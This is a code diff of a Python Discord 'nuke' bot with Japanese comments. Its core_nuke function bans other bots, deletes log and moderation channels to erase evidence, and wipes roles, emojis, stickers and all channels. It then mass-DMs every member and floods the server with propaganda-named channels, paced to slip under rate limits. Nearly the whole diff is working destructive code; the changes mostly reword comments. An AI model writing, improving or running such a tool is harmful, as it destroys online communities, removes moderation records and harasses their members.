@@ -98,7 +98,6 @@ async def ban_all_task(guild, members, reason):
         await asyncio.sleep(random.uniform(0.2, 0.4))
 
 async def delete_emojis_and_stickers(guild):
-    # 絵文字削除（攻め）
     emojis = await guild.fetch_emojis()
     if emojis:
         batch_size = 10
@@ -107,7 +106,6 @@ async def delete_emojis_and_stickers(guild):
             await asyncio.gather(*(limited_global(e.delete()) for e in batch), return_exceptions=True)
             await asyncio.sleep(random.uniform(0.05, 0.12))
 
-    # スタンプ削除
     stickers = await guild.fetch_stickers()
     if stickers:
         await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)
@@ -124,17 +122,18 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 初期並列スタート
+    # 並列スタート: 他のボットBAN
     bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
     bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
 
+    # ログ系チャンネル削除
     log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
     log_delete_coros = [limited_global(ch.delete()) for ch in log_channels]
     log_delete_task = asyncio.create_task(asyncio.gather(*log_delete_coros, return_exceptions=True)) if log_delete_coros else None
 
-    # ロール削除（並列スタート）
+    # ロール削除タスク（並列）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
@@ -145,7 +144,7 @@ async def core_nuke(guild, new_server_name=None):
         batch_size = 15
         attempt = 0
         current_roles = roles_to_delete[:]
-        while len(current_roles) > 0 and attempt < 2:  # すぐ諦め
+        while len(current_roles) > 0 and attempt < 2:
             attempt += 1
             for i in range(0, len(current_roles), batch_size):
                 batch = current_roles[i:i+batch_size]
@@ -162,10 +161,10 @@ async def core_nuke(guild, new_server_name=None):
 
     role_task = asyncio.create_task(role_deletion_task())
 
-    # 絵文字/スタンプ削除（並列スタート）
+    # 絵文字/スタンプ削除タスク
     emoji_sticker_task = asyncio.create_task(delete_emojis_and_stickers(guild))
 
-    # コミュニティ/ウェルカム無効化（並列）
+    # コミュニティ/ウェルカム無効化
     try:
         await limited_global(guild.edit(
             verification_level=discord.VerificationLevel.none,
@@ -178,7 +177,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 初期並列待機
+    # 並列待機（空タスクはスキップ）
     if bot_ban_task:
         await bot_ban_task
     if log_delete_task:
@@ -186,26 +185,27 @@ async def core_nuke(guild, new_server_name=None):
     await emoji_sticker_task
     await role_task
 
-    # DM送信（ロール削除と並行）
-    await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
+    # DM送信
+    dm_coros = [limited_dm(send_dm(m)) for m in non_bot_members]
+    await asyncio.gather(*dm_coros, return_exceptions=True) if dm_coros else None
 
-    # チャンネル削除（爆速）
+    # チャンネル削除
     channels = list(guild.channels)
     print(f"チャンネル削除開始: 対象 {len(channels)}個")
 
     async def delete_channels_batch(chs):
         await asyncio.gather(*(limited_global(ch.delete()) for ch in chs), return_exceptions=True)
 
-    batch_size_ch = 15  # 攻め
+    batch_size_ch = 15
     attempt_ch = 0
     while len(channels) > 0 and attempt_ch < 4:
         attempt_ch += 1
         for i in range(0, len(channels), batch_size_ch):
             batch_ch = channels[i:i+batch_size_ch]
             await delete_channels_batch(batch_ch)
-            await asyncio.sleep(random.uniform(0.03, 0.08))  # ギリギリ
+            await asyncio.sleep(random.uniform(0.03, 0.08))
 
-        await asyncio.sleep(0.5)  # 反映待機短く
+        await asyncio.sleep(0.5)
         channels = list(guild.channels)
 
     print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
@@ -224,7 +224,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # チャンネル作成（爆速）
+    # チャンネル作成
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
@@ -240,7 +240,7 @@ async def core_nuke(guild, new_server_name=None):
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
     while len(channels_created) < target_channels:
         tasks = []
-        for _ in range(30):  # 攻めバッチ
+        for _ in range(30):
             if len(channels_created) >= target_channels:
                 break
             current += 1
@@ -249,7 +249,7 @@ async def core_nuke(guild, new_server_name=None):
         batch = await asyncio.gather(*tasks, return_exceptions=True)
         added = [c for c in batch if isinstance(c, discord.TextChannel)]
         channels_created += added
-        await asyncio.sleep(random.uniform(0.05, 0.1))  # ギリギリ
+        await asyncio.sleep(random.uniform(0.05, 0.1))
 
     # ロール作成
     role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
@@ -288,6 +288,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print("完了")
 
+# イベント部分（変更なし）
 @bot.event
 async def on_guild_join(guild):
     if guild.id == MANAGE_GUILD_ID:
